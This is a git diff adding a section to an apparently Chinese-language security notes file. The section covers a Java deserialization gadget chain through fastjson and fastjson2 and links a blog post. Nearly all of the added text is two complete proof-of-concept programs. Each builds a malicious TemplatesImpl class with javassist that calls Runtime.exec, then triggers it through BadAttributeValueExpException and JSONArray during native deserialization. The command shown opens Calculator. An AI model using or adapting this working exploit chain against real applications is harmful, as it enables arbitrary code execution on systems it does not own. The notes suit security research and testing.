@@ -495,6 +495,122 @@ where config.hasFlowPath(source, sink)
 select source.getNode(), source, sink, sink.getNode()
 ```
 
+## FastJson与原生反序列化
+
+https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/   
+利用fastjson调用get、set的特性，构造出新的反序列化利用链。
+```
+import com.alibaba.fastjson.JSONArray;
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+
+public class Test {
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
+        clazz.addConstructor(constructor);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, "_bytecodes", bytes);
+        setValue(templates, "_name", "y4tacker");
+        setValue(templates, "_tfactory", null);
+
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templates);
+
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, jsonArray);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
+        objectOutputStream.writeObject(val);
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+
+```
+fastjson2
+
+```
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+
+import com.alibaba.fastjson2.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+
+public class Test {
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
+        clazz.addConstructor(constructor);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, "_bytecodes", bytes);
+        setValue(templates, "_name", "y4tacker");
+        setValue(templates, "_tfactory", null);
+
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templates);
+
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, jsonArray);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
+        objectOutputStream.writeObject(val);
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+
+```
+
 
 
 ## 各版本利用
